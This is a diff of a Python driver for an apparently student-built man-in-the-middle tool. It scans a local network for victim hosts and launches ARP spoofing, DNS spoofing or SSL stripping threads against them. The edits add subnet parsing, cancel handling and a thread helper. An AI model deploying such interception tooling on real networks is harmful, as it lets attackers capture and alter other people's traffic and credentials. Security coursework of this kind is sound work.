@@ -1,5 +1,13 @@
 #!/usr/bin/env python3
-
+"""
+Group 37: S.H.I.E.L.D
+Member:
+    - Robin Chung
+    - Gustas Gudaciauskas 
+    - Minh Nguyen
+    - Trung Pham 
+Project: Semi-Automated tool for ARP, DNS spoofing, and SSL stripping
+"""
 import argparse
 import sys
 import time
@@ -14,15 +22,21 @@ import os
 class MITMTool:
     def __init__(self, interface: str, gateway: str, attack_type: str, manual_mode: bool = False):
         self.interface = interface
-        self.gateway = gateway
+        # Handle gateway with or without subnet mask
+        if '/' in gateway:
+            self.gateway, self.network_mask = gateway.split('/')
+        else:
+            self.gateway = gateway
+            self.network_mask = '24'  # Default to /24 if not specified
+        
         self.attack_type = attack_type
         self.manual_mode = manual_mode
         self.threads: List[threading.Thread] = []
-        self.spoofers: List[ARPSpoofer | DNSSpoofer] = []
+        self.spoofers: List[ARPSpoofer | DNSSpoofer | SSLStripper] = []
 
     def setup_targets(self) -> List[str]:
         """Setup target IPs based on mode selection."""
-        scanner = NetworkScanner(self.gateway, self.interface)
+        scanner = NetworkScanner(self.gateway, self.interface, int(self.network_mask))
         scanner.start()
 
         if len(scanner.victim_list) == 0:
@@ -30,7 +44,11 @@ class MITMTool:
             sys.exit(1)
 
         if self.manual_mode:
-            picked = input(f'Pick a target IP (from 1 to {len(scanner.victim_list) - 1}): ').split(",")
+            try:
+                picked = input(f'Pick a target IP (from 1 to {len(scanner.victim_list) - 1}): ').split(",")
+            except KeyboardInterrupt:
+                print("\n[!] Operation cancelled by user")
+                sys.exit(0)
             return [scanner.victim_list[int(i)][0] for i in picked]
         return [x[0] for x in scanner.victim_list]
 
@@ -48,16 +66,12 @@ class MITMTool:
             dns_spoofer = DNSSpoofer(self.interface, target, self.gateway)
             self.spoofers.append(dns_spoofer)
             # Create a daemon thread for DNS spoofing
-            dns_thread = threading.Thread(target=dns_spoofer.start, daemon=True)
-            self.threads.append(dns_thread)
-            dns_thread.start()
+            self._start_thread(dns_spoofer.start)
 
         if self.attack_type == 'ssl':
             ssl_stripper = SSLStripper(self.interface, target, self.gateway)
             self.spoofers.append(ssl_stripper)
-            ssl_thread = threading.Thread(target=ssl_stripper.start, daemon=True)
-            self.threads.append(ssl_thread)
-            ssl_thread.start()
+            self._start_thread(ssl_stripper.start)
 
     def _start_thread(self, target_func) -> None:
         """Helper method to create and start a thread."""
